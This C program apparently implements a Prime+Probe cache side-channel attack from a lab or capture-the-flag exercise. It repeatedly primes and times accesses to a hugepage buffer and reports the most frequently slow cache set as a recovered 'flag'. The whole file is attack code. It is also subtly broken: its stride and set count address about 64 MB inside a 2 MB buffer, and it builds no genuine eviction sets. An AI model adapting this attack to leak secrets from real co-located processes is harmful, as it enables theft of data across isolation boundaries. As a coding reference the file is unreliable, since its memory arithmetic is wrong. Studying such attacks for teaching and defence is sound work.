#include "util.h"
#include <sys/mman.h>
#include <stdint.h>
#include <stdio.h>

#define BUFF_SIZE (2*1024*1024)
#define NUM_SETS 1024
#define STRIDE 65536
#define ROUNDS 1000

int main() {

    int flag = -1;

    char *buf = mmap(NULL, BUFF_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS |
                     MAP_PRIVATE | MAP_HUGETLB,
                     -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    buf[0] = 1;

    char *set_addr[NUM_SETS];
    uint64_t times[NUM_SETS];
    int scores[NUM_SETS] = {0};

    for (int i = 0; i < NUM_SETS; i++)
        set_addr[i] = buf + i * STRIDE;

    for (int round = 0; round < ROUNDS; round++) {

        // PRIME
        for (int i = 0; i < NUM_SETS; i++)
            *(volatile char*)set_addr[i];

        for (volatile int i = 0; i < 100000; i++);

        // PROBE
        for (int i = 0; i < NUM_SETS; i++)
            times[i] = measure_one_block_access_time((ADDR_PTR)set_addr[i]);

        uint64_t max_time = 0;
        int slow_set = -1;

        for (int i = 0; i < NUM_SETS; i++) {
            if (times[i] > max_time) {
                max_time = times[i];
                slow_set = i;
            }
        }

        scores[slow_set]++;
    }

    int best_score = 0;

    for (int i = 0; i < NUM_SETS; i++) {
        if (scores[i] > best_score) {
            best_score = scores[i];
            flag = i;
        }
    }

    printf("Flag: %d\n", flag);

    return 0;
}